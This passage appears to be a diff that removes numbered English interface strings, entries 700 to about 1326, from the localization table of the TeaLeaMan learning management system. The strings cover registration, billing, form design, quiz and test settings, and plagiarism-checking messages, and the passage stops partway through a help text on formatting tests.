-/*700*/"Miscellaneous Settings",
-/*701*/"System Roles",
-/*702*/"Registration Schemes",
-/*703*/"Data Transfer",
-/*704*/"Data Merge",
-/*705*/"JSP Template",
-/*706*/"My Evaluations",
-/*707*/"Vendor & Suppliers",
-/*708*/"Transferred Records",
-/*709*/"Evaluation Questionnaire",
-/*710*/"Evaluation Questionnaires",
-/*711*/"Course Evaluations",
-/*712*/"Evaluation Summaries",
-/*713*/"More Administration",
-/*714*/"Your institution just starts to adapt TeaLeaMan."+"\nYou may help to build the database by entering the  information of the courses and sessions that you are teaching or you plan to teach."+"\nIf you are not sure about certain information, just do your best."+"\nYour teaching administrator will finalize the records later."+"\nYou do need to enter the correct course ID if your institution uses course ID system",
-/*715*/"The central database does not have this record. You may enter the record",
-/*716*/"Please enter the code that you obtained from the system administrator",
-/*717*/"Course Registration",
-/*718*/"Subjects and Majors",
-/*719*/"Select Semester",
-/*720*/"Proceed",
-/*721*/"DoneSearch",
-/*722*/" is a mandatory field",
-/*723*/"Are you sure your selection of roles and departments? Hold 'Ctrl' key to select multiple roles.",
-/*724*/"Events and Calendar",
-/*725*/"Enter the name of the new item",
-/*726*/" exists already. Enter a new name or click OK to use the existing one",
-/*727*/"You have not submitted any work for this course yet",
-/*728*/"Tools for Students",
-/*729*/"Number of Lines",
-/*730*/"Number of English Words",
-/*731*/"Number of Characters",
-/*732*/"Hide",
-/*733*/"Width",
-/*734*/"Size",
-/*735*/"Printing Design",
-/*736*/"URL of Logo Image",
-/*737*/" Font",
-/*738*/"Color",
-/*739*/"Column Heading",
-/*740*/"Table Cell",
-/*741*/"Table Border",
-/*742*/"Row selection",
-/*743*/"Auto Line Folding",
-/*744*/"Default",
-/*745*/"Customization",
-/*746*/"By default, the table has",
-/*747*/" blank rows for entering new data. But you can specify Total Number of Rows as",
-/*748*/"You need to reload the page after setting.",
-/*749*/"Apply",
-/*750*/"For example",
-/*751*/"No one is waiting for you to communicate. You may click ... to choose a person to initiate a conversation",
-/*752*/"Click a name to view the initiator's information,<br>or click  >> to start to talk,<br>or click ... to choose a person to initiate a talk",
-/*753*/"Please enter the user ID of the person you want to talk. Click ... to choose a user ID",
-/*754*/"This is yourself",
-/*755*/"Only one person can you initiate to talk with",
-/*756*/"Selective:Fraction n/m means to select n courses out of the adjacent m courses",
-/*757*/"Status:you may change the registration status",
-/*758*/"Show how much the student's courses satisfies the requirements of the curriculum.",
-/*759*/"Entering Date",
-/*760*/"Previous School",
-/*761*/"Completed Credits",
-/*762*/"GPA",
-/*763*/"Transferred Credits",
-/*764*/"Time conflict between",
-/*765*/"Ignore this and continue",
-/*766*/"Course Registration",
-/*767*/"Don't use both candidate and exception",
-/*768*/"The data have been modified. Do you want to save the changes?",
-/*769*/"Degree pursue",
-/*770*/"Enter a new semester, such as Spring 2008",
-/*771*/"Normal Registration or Listener:"+"\nIf you register",
-/*772*/"for normal registration, click \"OK\". Otherwise as a listener, click \"Cancel\".",
-/*773*/"Registration Changes",
-/*774*/"The total size of your web files exceeds the quota. Delete some unused files and try again.",
-/*775*/"This document can contain a digital signature. But a certain amount of fee may be charged for the service of digital signature. Do you want to have a digital signature?",
-/*776*/"Professional Information",
-/*777*/"Don't send email unless the message is very important or you believe the recipient can not login",
-/*778*/"The message has been sent out."+"\nIf the message is very important, you may allow the system to send this message again using regular email. Do you want to do that?",
-/*779*/"Attach",
-/*780*/"Encryption key lost. Relogin and reload this page.",
-/*781*/"Prerequisites not met",
-/*782*/"needs",
-/*783*/"Hold Shift key to select consecutive items<br>Hold Ctrl key to select discrete multiple items",
-/*784*/"The entry has been truncated because it exceeded the maximum number of characters for this field:",
-/*785*/"Modifications of Routine",
-/*786*/"Common Questions",
-/*787*/"Attachment",
-/*788*/"For selective fields, print internal value",
-/*789*/"Print row number",
-/*790*/"Systems on Web,Inc.All rights reserved",
-/*791*/"The input has not been saved",
-/*792*/"Save the definition?",
-/*793*/"Commit this change?",
-/*794*/"You can edit it",
-/*795*/"Next Page",
-/*796*/"It looks like this",
-/*797*/"Save As",
-/*798*/"Free-Format Assignment@Formatted Assignment@Free-Format Test@Formatted Test@Class Quiz",
-/*799*/"The following records were not saved successfully",
-/*800*/"A record with the same key fields exist already.",
-/*801*/"None",
-/*802*/"Announcement Index",
-/*803*/"Containing or Equal to",
-/*804*/"Later than or On",
-/*805*/"Earlier than or On",
-/*806*/"Grater than or Equal to",
-/*807*/"Less than or Equal to",
-/*808*/"Equal to",
-/*809*/"Delete the selected rows of records",
-/*810*/"Delete the current record",
-/*811*/"Optional Setting of Assignment/Test",
-/*812*/"Save this old assignment as an assignment for the current semester to reuse it."+"\nUser has to change the values of Start, Due and Sessions",
-/*813*/"Enter the Sessions:",
-/*814*/"Assignment Index",
-/*815*/"Font Size and Time Format",
-/*816*/"Column",
-/*817*/"Data",
-/*818*/"Incorrect",
-/*819*/"Incorrect regular expression",
-/*820*/"Pause",
-/*821*/"Resume",
-/*822*/"Enlarge",
-/*823*/"Fontsize & Time Format",
-/*824*/"Don't forget to submit your work later. The grader can only see your Submitted work, but not Saved work.",
-/*825*/"Warning: You are violating the rules of testing. Please restore the test window immediately or the window will be closed in a few seconds and your score will be zero.",
-/*826*/"Stay",
-/*827*/"s",
-/*828*/"Window",
-/*829*/"Set",
-/*830*/"NMTWRFS",
-/*831*/"Daily",
-/*832*/"Once",
-/*833*/"This submission is not final yet and student will update it before the due. Don't grade it until the due.",
-/*834*/"Discussion Board Index",
-/*835*/"Click this heading to save the changes on the locks.",
-/*836*/"A file with the same name exists in the current folder. Override it?",
-/*837*/"Search Discussion Board",
-/*838*/"Only five minutes left",
-/*839*/"routines were found.",
-/*840*/"Form Management",
-/*841*/"Submit Form",
-/*842*/"Search Data",
-/*843*/"Review Multi Records",
-/*844*/"Update One Record",
-/*845*/"Delete One Record",
-/*846*/"Review One Record",
-/*847*/"Enter record order number",
-/*848*/"Yes",
-/*849*/"No",
-/*850*/"Are you sure you want to submit the grade report now?",
-/*851*/"Please save the file",
-/*852*/"TeaLeaMan File Synchronizer is a Java desktop application allowing you to keep your web file folders"+"\nsynchronized with your local file folders. It also performs local folder synchronization and backup."+"\nMake sure your computer has the Java virtual machine installed, then click the Yes button to download"+"\nthe executable file to your computer and double click it to execute. Do you want to download it now?",
-/*853*/"Registration Management",
-/*854*/"Fees, Bills and Payments",
-/*855*/"Fees and Prices",
-/*856*/"Balance Summary",
-/*857*/"Payments",
-/*858*/"Bills",
-/*859*/"??X??: The value of parameter X  passed from the caller; @@X@@: The current value in the field X; $$X$$: If the field X is modified, it is the modified value."+"\nBut if the field X is not modified, the phrase field=$$X$$ will be dropped from the SQL statement (this allows only modified values"+"\nsent to the server; ||X||: The old value of the field X",
-/*860*/"X_a: present field X using a multiple-line text box;"+"\nX_b: present field X using a inner table;"+"\nX_c: present field X using a check box;"+"\nX_f: present field X in the format specified by the value in the field <b>format</b>;"+"\nX_h: present field X using in a hidden field;"+"\nX_i: display the document linked by the field X's URL data in an insert frame;"+"\nX_k: present field X as a link with the caption ..., which is used to revoke a data picker;"+"\nX_l: present field X using an active link;"+"\nX_m: present field X in date time format specified by the registered user or the system;"+"\nX_n: present field X in numeric format (n_3_2 stands for 3 digits with two decimals);"+"\nX_p: mask a password;"+"\nX_r: present field X using radio buttons;"+"\nX_s: present field X using a drop-down menu;"+"\nX_t: present field X using a single-line text box;"+"\nX_u: display the image linked by the field X's URL data;"+"\nCapital: X_A, X_C, X_L, X_M, X_N, X_P, X_R, X_S, X_T, and X_U are the non-editable mode  corresponding  to the lower case letter;"+"\n_20_10: dimension meaning that the width is 20 and height is 10;"+"\n_count: display in the column footer the number of the data items in a column;"+"\n_dcunt: display  in the column footer the number of the distinct data items in a column;"+"\n_sum:   display  in the column footer the sum of the data items in a column;"+"\n_max:   display  in the column footer the maximum value of the data items in a column;"+"\n_min:   display  in the column footer the minimum value of the data items in a column;"+"\n_mean:  display  in the column footer the mean value of the data items in a column;"+"\n_sdv:   display  in the column footer the standard deviation of the data items in a column",
-/*861*/"Ways for Presenting a Field",
-/*862*/"To convert forms from Microsoft Word file or PDF file to web form, click the \"Form Converter\" link"+"\nTo design a new form from scratch or modify existing forms, click \"Form Design\" link"+"\nTo fill out form or manage data, click a \"+\" sign to expand a category",
-/*863*/"This format is used to",
-/*864*/"If this format is appropriate for this field, press the TAB key, otherwise select other format",
-/*865*/"Used to",
-/*866*/"Click this link to see the select items for common fields such as state, gender, and semester",
-/*867*/"You may test the design by clicking the Test button or enter another field using the next blank row",
-/*868*/"TeaLeaMan has been designed to take advantages of the tab-browsing feature.<br> In the options setting of your browser, find and check \"Always open new page in tab\"",
-/*869*/"",
-/*870*/"",
-/*871*/"Hold Shift key when you click the page link",
-/*872*/"Don't show this hint again",
-/*873*/"on your browser, <br>find the setting like \"Always open a new page in tab\"",
-/*874*/"Please save this receipt to your computer. It is the only proof of the submission you just made."+"\n In case of a dispute, your instructor will not honor your claim unless you present this receipt."+"\n It is also a file backup in case the file server collapses",
-/*875*/"Move up the selected row",
-/*876*/"Move down the selected row",
-/*877*/"Delete the selected rows",
-/*878*/"Test the form design",
-/*879*/"Save the form design",
-/*880*/"This webpage requires a recent browser such as Mozilla/Netscape 7+ or Internet Explorer 6 + MathPlayer",
-/*881*/"A password msut contain more than eight characters",
-/*882*/"Click the New button to enter searching requirements, then Click Search button",
-/*883*/"You have not  selected a file to attach. Click the 'Browse' button",
-/*884*/"Five minutes left.",
-/*885*/"Select an item",
-/*886*/"Message length  exceeds the limit 2000",
-/*887*/"is the fixed folder. If delete one of it, many functions in the system will fail. Extremely caution",
-/*888*/"The new name you just entered contains invalid character",
-/*889*/"The following course you have taken are not required for your degree. You may negotiate with your adviser or register to use these courses to substitute for some required courses",
-/*890*/"The submissions satisfying the selecting requirements are all in the database. No new submission is needed",
-/*891*/"There is no record satisfying the selecting requirements",
-/*892*/"A blank character is found at the front or the end of the value in a key field. This may cause a problem. Do you want to trim it?",
-/*893*/"There is no pair of submissions in this selection that have 90% of text in common",
-/*894*/"Database Development",
-/*895*/"System Development",
-/*896*/"Select a display format",
-/*897*/"Enter the hint",
-/*898*/"Do you want to save the conversion to generate a web form now?",
-/*899*/"The following files have not been copied successfully",
-/*900*/"The following files have not been moved successfully",
-/*901*/"Delete selected records in subforms",
-/*902*/"Partial answers",
-/*903*/"UPDATE and the DELETE statements can not be generated",
-/*904*/"The following files have not been deleted",
-/*905*/"Don't delete the blank row",
-/*906*/"is too long to be saved in the database. Too many attachments!",
-/*907*/"has an incorrect format. Enter time slots in the format: xx:xx-xx:xx",
-/*908*/"Record Identification",
-/*909*/"Click the Detail link of each suspicious plagiarism to judge if it is an actual plagiarism. Click  Delete  if it is not.",
-/*910*/"No suspicious plagiarism was found",
-/*911*/"Matched rows",
-/*912*/"Plagiarism Checker",
-/*913*/"Graded",
-/*914*/"When you submit homework or take test on this system,  your computer may loss connection with the server, in particular,  when you use unstable wireless, which will make your submission fail."+"\nBecause your connection stability is beyond the system's control,  it is your responsibility to make sure your submission go through by receiving a <b>receipt</b>."+"\nIf you see no receipt after you click the Submit button, your submission must have failed. In such a case, you have to save your  answers to your computer or device and redo the submission after you reconnect to the Internet and relogin to the system."+"\nWhen you see a receipt,  you must save it on your computer or device (you may right click the page and choose the Save from the menu)."+"\nA receipt is the only proof of your submission and, in case of a dispute, your instructor will not honor your claim of a submission unless you can send him/her a receipt as an email attachment.",
-/*915*/"NotGraded",
-/*916*/"Create a new data merge task",
-/*917*/"Search data merge task",
-/*918*/"Test the current data merge task",
-/*919*/"Save as a new data merge task. The current one will stay",
-/*920*/"Show the URL link to publish the current data merge task",
-/*921*/"How to Write Double Queries to Retrieve Data: a. Use one or more blank lines to separate two queries<br>"+"\nb. Use ??X?? for parameters passed from the caller<br>c. Use ##X## in the second query to reference   column X in the first query",
-/*922*/"How to Edit Model Document: a. Use %%XX%% to reference   column X in the first query<br>b. Use $$X$$ to reference   column X in the second query"+"\n<br>c. The line that navigates through the data rows  has to repeat itself exactly, like this"+"\n<br> something $$XX$$ more $$YY$$ more"+"\n<br> something $$XX$$ more $$YY$$ more",
-/*923*/"Estimate",
-/*924*/"Variable Notations",
-/*925*/"New an Item",
-/*926*/"Your incomplete answers have been saved temporarily. But you still have to come back before the due to complete all answers and submit them.<br>Please save the text inside the textbox on the right-hand side to your local disk as a backup.",
-/*927*/"Tuition Policy",
-/*928*/"s Non",
-/*929*/"concurrent",
-/*930*/"Tools for Editing for",
-/*931*/"rolecode",
-/*932*/"Select System Roles",
-/*933*/"Permit Roles",
-/*934*/"permits",
-/*935*/"Plus User",
-/*936*/"Except User",
-/*937*/"srt",
-/*938*/"subdb",
-/*939*/"DBOwner Data",
-/*940*/"Knowledge Unit",
-/*941*/"Extent",
-/*942*/"Contact Hour",
-/*943*/"Course Hours",
-/*944*/"All Hours",
-/*945*/"Acm Hours",
-/*946*/"Num",
-/*947*/"Met",
-/*948*/"Rmap",
-/*949*/"Program ACM Knowledge Units",
-/*950*/"Password Question",
-/*951*/"Password Answer",
-/*952*/"Tuition by Course",
-/*953*/"Key Word",
-/*954*/"Language",
-/*955*/"specific Keywords",
-/*956*/"Curriculum of",
-/*957*/"User Information",
-/*958*/"Courses Master Table",
-/*959*/"Uid",
-/*960*/"Pay Amount",
-/*961*/"Pay Time",
-/*962*/"Pay Way",
-/*963*/"Receiving Fee Payments",
-/*964*/"Ask Question about",
-/*965*/"Payment Id",
-/*966*/"Select Students",
-/*967*/"http",
-/*968*/"localhost",
-/*969*/"sample",
-/*970*/"html",
-/*971*/"cid",
-/*972*/"Staffing Preference",
-/*973*/"Course List",
-/*974*/"nolabel",
-/*975*/"Student Basic Information",
-/*976*/"Registered Courses",
-/*977*/"sid",
-/*978*/"Request Status",
-/*979*/"dummy",
-/*980*/"s Review of Requests of Changing Registration",
-/*981*/"Assignments",
-/*982*/"Sessions of",
-/*983*/"Selected Instructors",
-/*984*/"Values of",
-/*985*/"From Status",
-/*986*/"To Status",
-/*987*/"Rate To Tuition",
-/*988*/"History",
-/*989*/"Tuition Charge",
-/*990*/"Refund Policy",
-/*991*/"View Values",
-/*992*/"Update Values",
-/*993*/"cnt",
-/*994*/"Domains",
-/*995*/"Taskname",
-/*996*/"Fieldlabels",
-/*997*/"Ctypes",
-/*998*/"Orders",
-/*999*/"Defaultv",
-/*1000*/"Preferences of Time Slot",
-/*1001*/"Textbooks",
-/*1002*/"Course Syllabus",
-/*1003*/"User Contact Information",
-/*1004*/"Whose Hand",
-/*1005*/"Target",
-/*1006*/"Decision",
-/*1007*/"Push To",
-/*1008*/"Hire Date",
-/*1009*/"Faculty Detailed Information",
-/*1010*/"Goal",
-/*1011*/"dummy",
-/*1012*/"Assessment",
-/*1013*/"Course Goal",
-/*1014*/"Learning Objectives",
-/*1015*/"Tools for Grading for",
-/*1016*/"Threshold",
-/*1017*/"Session Evaluation Summary",
-/*1018*/"Select a Course",
-/*1019*/"Student Email Address",
-/*1020*/"User Data",
-/*1021*/"Majors",
-/*1022*/"Assigntest",
-/*1023*/"SubmittedAt",
-/*1024*/"atype",
-/*1025*/"Frequently Asked Questions",
-/*1026*/"onload",
-/*1027*/"All Sessions",
-/*1028*/"Urge to Pay",
-/*1029*/"End Time",
-/*1030*/"Announcement  for",
-/*1031*/"Sex",
-/*1032*/"Race",
-/*1033*/"Stand Test Score",
-/*1034*/"Highest Degree",
-/*1035*/"Employment",
-/*1036*/"Family",
-/*1037*/"Reference",
-/*1038*/"Operations for File Type",
-/*1039*/"cellonblur",
-/*1040*/"Amount",
-/*1041*/"Bills and Payments",
-/*1042*/"Student Data",
-/*1043*/"Edit Posting",
-/*1044*/"Academic Program",
-/*1045*/"All My Sessions",
-/*1046*/"Tools for",
-/*1047*/"Checking",
-/*1048*/"Unit",
-/*1049*/"Bill Time",
-/*1050*/"Time Now",
-/*1051*/"Charge Fees and Send Bills",
-/*1052*/"Notify Instructors to Input Preferences",
-/*1053*/"Course Schedule",
-/*1054*/"Supplier",
-/*1055*/"Post Date",
-/*1056*/"Compose Message",
-/*1057*/"rdap",
-/*1058*/"exbut",
-/*1059*/"Feedbeek",
-/*1060*/"Textbook Data Form",
-/*1061*/"Recipient Id",
-/*1062*/"Sent Message",
-/*1063*/"My Course Sessions",
-/*1064*/"Fee Id",
-/*1065*/"Price Floating of",
-/*1066*/"Session of",
-/*1067*/"allids",
-/*1068*/"Open Assignments",
-/*1069*/"Selections of Teaching Evaluations",
-/*1070*/"Institution",
-/*1071*/"Transferred Course Work",
-/*1072*/"Time Preference of",
-/*1073*/"Instructor Time Preference",
-/*1074*/"dept",
-/*1075*/"Candidates",
-/*1076*/"Exceptions",
-/*1077*/"My Current Session",
-/*1078*/"Percent Off",
-/*1079*/"Discount History of",
-/*1080*/"RdapName",
-/*1081*/"User Details",
-/*1082*/"Task Name",
-/*1083*/"Field Labels",
-/*1084*/"iso",
-/*1085*/"Routine Interface",
-/*1086*/"Session Data",
-/*1087*/"Search User",
-/*1088*/"User Registration Policy",
-/*1089*/"Regular Email",
-/*1090*/"This Semester",
-/*1091*/"Preferred Courses",
-/*1092*/"for Next Semester",
-/*1093*/"Compose and Send Message",
-/*1094*/"Mobile Phone",
-/*1095*/"PreviousSchool",
-/*1096*/"PreviousDegree",
-/*1097*/"Experience",
-/*1098*/"Applicants",
-/*1099*/"onsaved",
-/*1100*/"My Current Sessions",
-/*1101*/"Course Plan to Teach in",
-/*1102*/"User Registration Form",
-/*1103*/"Block Number",
-/*1104*/"Icon",
-/*1105*/"Order Number",
-/*1106*/"Function Blocks",
-/*1107*/"Command",
-/*1108*/"Path",
-/*1109*/"Authorized Roles",
-/*1110*/"Command Line Programs",
-/*1111*/"Time Share in",
-/*1112*/"All My Teaching Evaluation in Spring",
-/*1113*/"for",
-/*1114*/"Academic Calendar and Events",
-/*1115*/"Calendar",
-/*1116*/"Events",
-/*1117*/"Compose Time",
-/*1118*/"Edit Announcement to Selected Users",
-/*1119*/"pickstudent",
-/*1120*/"pickuser",
-/*1121*/"Iterative Scheduling",
-/*1122*/"CID",
-/*1123*/"Who Is Approving",
-/*1124*/"Map",
-/*1125*/"Course Topics mapping to",
-/*1126*/"Permits",
-/*1127*/"Rdap Name",
-/*1128*/"Links for Index Page",
-/*1129*/"Topics",
-/*1130*/"Map To Knowledge Unit",
-/*1131*/"Schedule Dates",
-/*1132*/"Reading",
-/*1133*/"Map to ACM Knowledge Units of",
-/*1134*/"Non",
-/*1135*/"concurrent Sessions",
-/*1136*/"Reasons to Deny Request for",
-/*1137*/"Changing Registration Status",
-/*1138*/"System Administration User Registration",
-/*1139*/"Groups",
-/*1140*/"Discussion Grouping",
-/*1141*/"Time Slots",
-/*1142*/"Classroom Preference",
-/*1143*/"Stud Name",
-/*1144*/"User Professional Information",
-/*1145*/"Folder Name",
-/*1146*/"Folder Path",
-/*1147*/"Backup Path",
-/*1148*/"Do It Now",
-/*1149*/"Backup Folders",
-/*1150*/"Session",
-/*1151*/"Reply Message",
-/*1152*/"Reply Format",
-/*1153*/"Suppress This",
-/*1154*/"ord",
-/*1155*/"Received During Last Three Days",
-/*1156*/"courseid",
-/*1157*/"sname",
-/*1158*/"Composition of",
-/*1159*/"Course Selection Master",
-/*1160*/"Selected Web Application Services",
-/*1161*/"Received Message",
-/*1162*/"Assignments and Tests",
-/*1163*/"User Database",
-/*1164*/"Tools for Student for",
-/*1165*/"Create a New Posting",
-/*1166*/"Charge Time",
-/*1167*/"Charge Amount",
-/*1168*/"Fee Charged",
-/*1169*/"Taken Notes of",
-/*1170*/"Cname",
-/*1171*/"Descript",
-/*1172*/"Dean",
-/*1173*/"Colleges",
-/*1174*/"Reset User Password",
-/*1175*/"Curriculum",
-/*1176*/"Teaching Load of",
-/*1177*/"Feeid",
-/*1178*/"ChargeTime",
-/*1179*/"ChargeAmount",
-/*1180*/"Closed Assignments",
-/*1181*/"Student Record Entry Form",
-/*1182*/"SSN",
-/*1183*/"Announcement  to Selected Users",
-/*1184*/"Edit Announcement",
-/*1185*/"Department Data Entry Form",
-/*1186*/"Permission of Routine",
-/*1187*/"Contact Information",
-/*1188*/"Teaching Preference",
-/*1189*/"Attribute",
-/*1190*/"Course Details",
-/*1191*/"Find  Student Id",
-/*1192*/"Statement",
-/*1193*/"Count",
-/*1194*/"Feedback of Using Tea Lea Man",
-/*1195*/"Transferred Course",
-/*1196*/"Home ZipCode",
-/*1197*/"timeNow",
-/*1198*/"subs",
-/*1199*/"Submitted Assignments",
-/*1200*/"Tests",
-/*1201*/"Author Name",
-/*1202*/"Roles in the System",
-/*1203*/"Preferred",
-/*1204*/"Except Time of Courses  for Next Semester",
-/*1205*/"Web Application Services",
-/*1206*/"Application Eligibility",
-/*1207*/"Application Deadline",
-/*1208*/"Admission Standard",
-/*1209*/"Lodge",
-/*1210*/"User Account Update",
-/*1211*/"Discussion Groups",
-/*1212*/"pass",
-/*1213*/"Sessions Available",
-/*1214*/"Select Message Recipients",
-/*1215*/"Attend Today",
-/*1216*/"Total Attend",
-/*1217*/"User Public Information",
-/*1218*/"Face Price",
-/*1219*/"Price Float",
-/*1220*/"Discount",
-/*1221*/"Fees",
-/*1222*/"Tname",
-/*1223*/"Apptables",
-/*1224*/"The address of your website will be",
-/*1225*/"where",
-/*1226*/"is the name of your website, which should be associated with you, spelled in English letters, easy to remember and unique. Enter such a name:",
-/*1227*/"Your website folder has been removed from public folder and gets moved to your folder as",
-/*1228*/"Your website has been created, which maps to the folder named \"website\". You can upload and manage your web pages.",
-/*1229*/"Because \"website\" is a reserved word, original folder named \"website\" has been renamed to",
-/*1230*/"Solution or Answer",
-/*1231*/"Options",
-/*1232*/"Allow students to use other resources on the computer",
-/*1233*/"Allow students to review  the test questions after the test",
-/*1234*/"Show test results immediately after submission",
-/*1235*/"Font on test page",
-/*1236*/"Size",
-/*1237*/"How to compute scores: drop lower",
-/*1238*/"The only literals used in the formula",
-/*1239*/"numbers",
-/*1240*/"e.g. 100 0.5  2.3333",
-/*1241*/"the total score after dropping the lowest",
-/*1242*/"the total number of questions",
-/*1243*/"The only operators used in formula",
-/*1244*/"addition operator",
-/*1245*/"subtraction  operator",
-/*1246*/"multiplication  operator",
-/*1247*/"division  operator",
-/*1248*/"exponential  operator",
-/*1249*/"There must be an operator between two literal.",
-/*1250*/"The examples of formula",
-/*1251*/"raw scores",
-/*1252*/"rescale to 100 pts",
-/*1253*/"use square root",
-/*1254*/"minimum 30 pts",
-/*1255*/"formula is mandatory",
-/*1256*/"is not a valid literal",
-/*1257*/"is not a valid operator",
-/*1258*/"Initialize score to zero on server when a student starts to take the test",
-/*1259*/"items, sum the rest, and normalize by formula",
-/*1260*/"Parentheses",
-/*1261*/"Style",
-/*1262*/"IP of computers used for test contains",
-/*1263*/"Password for students to start the test",
-/*1264*/"IP of This Computer",
-/*1265*/"Maximum time allowed",
-/*1266*/"Until the due",
-/*1267*/"minutes",
-/*1268*/"Points",
-/*1269*/"Draw",
-/*1270*/"End Talk",
-/*1271*/"Who Are",
-/*1272*/"Public Area",
-/*1273*/"This operation is only for specific department. Please choose department",
-/*1274*/"Paste",
-/*1275*/"Session: The name of a collection of students who register the same course, in same classroom and during the same time slot"+"\nStart: Normally the starting time of a class quiz is the same time as the starting time of the scheduled class, but it can be changed"+"\nDue: Normally the due of a class quiz  is   15 minutes after the class ends, but it can be changed"+"\nStatus: New -- The quiz has just been initialized before the class.<br>Editing -- the quiz has been saved and it is before class<br>Current -- during the class, both questions and answers are still editable, but the answer part is invisible when editing"+"\n#Participants: The number of participants is counted automatically on the sever"+"\nFont Size: The font size for displaying question number and text can be changed instantly"+"\nWeight: the percentage of this class quiz that counts in the final course evaluation"+"\n#:Question number"+"\nQuestion:Question text can be prepared before the class, during the class, or provided orally (say, the first question is...)"+"\nAnswer: Auto-grading/scanning/estimating is enabled while the answers are provided"+"\nAnswered:The total number of students who answered the question"+"\nRight:The total number of students who answered the question correctly.<br>A student's answer to an open question is considered to be correct if it matches with your answer for at least 60% in plaintext.<br> For higher accuracy, please make corrections on the Grading page"+"\nRatio:The percentage of correct answers for each question and overall"+"\nObjective: For assessments, the teaching goals of the question serves"+"\nFirst: The first person who answers the question and the person who answers most questions first"+"\nSave: Any modification  to the questions, answers and assessments can affect the on-going class quiz"+"\nDelete: Delete can be performed only for status New or Edit"+"\nGrade: Grading can be performed only after all participants have submitted their answers or after the due"+"\nAssessment: To show, edit or hide the assessment  details"+"\nWinner: To show who  answers each question and who  answers most questions first"+"\nCopy: Copy the contents of the class quiz to be pasted to another new class quiz"+"\nTextbox: To edit questions and answers in text boxes, in particular, to get pasted from other sources"+"\nHelp:To display all hints",
-/*1276*/"Separate questions by  blank line",
-/*1277*/"Race",
-/*1278*/"Unsubmit",
-/*1279*/"Scan All",
-/*1280*/"Display Way",
-/*1281*/"Data Form",
-/*1282*/"Data Table",
-/*1283*/"#",
-/*1284*/"Now all incomplete due submissions have been graded or estimated. You may reload this page",
-/*1285*/"Drop Lowest",
-/*1286*/"Formula",
-/*1287*/"Leaving Seconds",
-/*1288*/"Sum",
-/*1289*/"Reduce one point for every minute of leaving test page",
-/*1290*/"Reduce one point for every two minutes of leaving test page",
-/*1291*/"Class Quiz",
-/*1292*/"Maximum Number of Rows"+"\nMaximum Number of Columns"+"\nOptional Cell Width"+"\nOptional Cell Height"+"\nApplyCell"+"\nUndoText"+"\nColors"+"\nHtmlCode"+"\nClick X to cut off some of your current selected frequent colors,  and click to pick some from the above web safe colors"+"\nYou may also modify this file,  then click the Upload button to see the conversion"+"\nFinished, Going to deliver"+"\nCopy the codes to a notepad and save them as a html file"+"\nParse"+"\nDesign"+"\nEdit Text"+"\nClose"+"\nInsert table"+"\nCopy table"+"\nDel table"+"\nPlease enter an  integer"+"\nEnter parameters to create the new page  or click Cancel to redesign existing page"+"\nSelect rectangle"+"\nInsert cell"+"\nDel cell"+"\nInsert row"+"\nDrag"+"\nInsert div"+"\nPaste table"+"\nGradient"+"\nWidth"+"\nSet"+"\nMore"+"\nFontsiz"+"\nColor"+"\nDel row"+"\nCut Splitter"+"\nNext"+"\nCancel"+"\nTest"+"\nStartColor"+"\nEnd Color"+"\nOrientation"+"\nHorizontal"+"\nVertical"+"\nBg url"+"\nAlign"+"\nBorder"+"\nSpacing"+"\nPadding"+"\nCell id"+"\nTableid"+"\nValign"+"\nBgcol"+"\nClass"+"\nSave"+"\nThere are two distinct modes in this tool: the Text-Editing mode and Cell-Styling mode.  Click a cells to include it to a group of cells to which you can enter text or style uniformly by using the context menu. Just click the buttons on the context menu to see the styling results.<br><br>After you select two cells, you have an option to cut off the separating lines between them. In this way, you can make a bigger area to put a big object such as image on inner table."+"\nApplyTable",
-/*1293*/"Use@fill",
-/*1294*/"Process",
-/*1295*/"Crop frame",
-/*1296*/"Image Process",
-/*1297*/"No;No",
-/*1298*/"Last Update",
-/*1299*/"Regular Expr",
-/*1300*/"Case Sensitive",
-/*1301*/"Received Attach",
-/*1302*/" Send Attachment",
-/*1303*/"Imagelet",
-/*1304*/"Online@Busy@Leave",
-/*1305*/"Question,Points,For Objective",
-/*1306*/"The system has deleted the attach files that have not been used",
-/*1307*/"Text File@Web Page@Lecture@CSS",
-/*1308*/"Student Name",
-/*1309*/"Race Order",
-/*1310*/"Time Spent",
-/*1311*/"Score",
-/*1312*/"Right-click the link to download. The file will be kept on server for one day",
-/*1313*/"Time out occurd after a long idle time. Send a message to rejoin",
-/*1314*/"(Un)Revoke",
-/*1315*/"MoveTo",
-/*1316*/"Block",
-/*1317*/"This incomplete submission has passed the due. Do you want to grade all incomplete past-due submissions now?",
-/*1318*/"How to assign homework or make tests:"+"\n1. Enter questions here and answers next to this. Press guideline and you can see an example (press Example), or"+"\n2. Write on a piece of paper, then take a picture by using your cell phone and upload it (look for Attach button in the tool bar), or"+"\n3. Simply write the  numbers of the questions selected from the textbook, or"+"\n4. Write nothing except for the Name of the Assignment/test, and speak out the questions during class",
-/*1319*/"Guided",
-/*1320*/"Please press the Preview button to verify the correct format",
-/*1321*/"Please check if the system has regraded the submissions. Manual grading may be needed",
-/*1322*/"Example",
-/*1323*/"Details about the role of this assignment/test in course assessment",
-/*1324*/"Guided entry dialog for you to enter questions, answers and points",
-/*1325*/"All due but incomplete submissions have just been graded or estimated. Please reload this page and check them.",
-/*1326*/"The rules for formatting  test/assignments are simple:"+"\n(1) Order questions using numbers, and separate the ordering number and the question text by using a space, comma or a parenthesis"+"\n(2) Put a blank line before each question ordering number"+"\n(3) Order answer choices by using alphabets (a,b,c,d,..) or (A,B,C,D...). Separate the ordering letter and the text by using a space, comma or a parenthesis"+"\n(4) The ordering number or ordering letter has to be the first character in the line."+"\nHere is an example showing these formatting rules and the features of the multiple-choice-short-answer assignment/test as well:"+"\n1. What are  multiple-choice-short-answer assignment/tests?"+"\na.They are the assignment/tests that contain  either multiple-choice questions only or short-answer questions only"+"\nb. They are the assignment/tests that can contain both multiple-choice questions and short-answer questions"+"\n2. What formats do  multiple-choice-short-answer assignment/tests support?"+"\na.Text"+"\nb.HTML"+"\nc.LaTeXML"+"\nd.All of the above"+"\n3. Multiple-choice-short-answer test/assignments have the  TeaLeaMan tool bar"+"\na.true"+"\nb.false"+"\n4. Multiple-choice-short-answer test/assignments allow file attachments"+"\na.true"+"\nb.false"+"\n5. Multiple-choice-short-answer test/assignments will be graded automatically."+"\na.sure"+"\nb.definitely no"+"\nc.depending on if answers are supplied"+"\n6. How many options one can set when making a multiple-choice-short-answer  test?"+"\na.0"+"\nb.2"+"\nc.4"+"\nd.8"+"\n7. Is  there a default point  for each question?"+"\na. yes"+"\nb. no"+"\n8. When student testers can see their test results?"+"\na.immediately after submission"+"\nb.after due"+"\nc.one hour after 